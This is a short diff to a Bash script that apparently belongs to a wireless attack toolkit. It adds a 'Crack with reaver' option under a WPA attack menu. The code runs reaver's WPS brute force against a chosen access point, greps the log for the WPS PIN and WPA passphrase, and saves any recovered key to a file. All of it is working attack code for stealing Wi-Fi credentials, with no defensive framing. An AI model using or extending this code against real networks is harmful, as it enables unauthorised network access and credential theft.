@@ -1,8 +1,13 @@
 p_menu+=("Crack with reaver")
+extend_menu[Select WPA Attack]="Crack with reaver"
 
 Crack_with_reaver(){
     [[ $Host_MAC ]] && {
-        execute "Reaver" reaver -i $wifi -b $Host_MAC
+        execute "Reaver" reaver -i $wifi -b $Host_MAC &> $DUMP_PATH/reaver_$Host_MAC.log
+        cat $DUMP_PATH/reaver_$Host_MAC.log | egrep -i "WPS PIN|WPA PSK| AP SSID" && echo "Press enter to continue" || echo "${mark} Reaver could not get the key, press enter to continue"
+        cat $DUMP_PATH/reaver_$Host_MAC.log | egrep -i "WPA PSK" && {
+            cat $DUMP_PATH/reaver_$Host_MAC.log | egrep -i "WPA PSK" >> $DUMP_PATH/$Host_MAC.key
+        }
     } || {
         echo "${mark} You have to select a network first"
     }
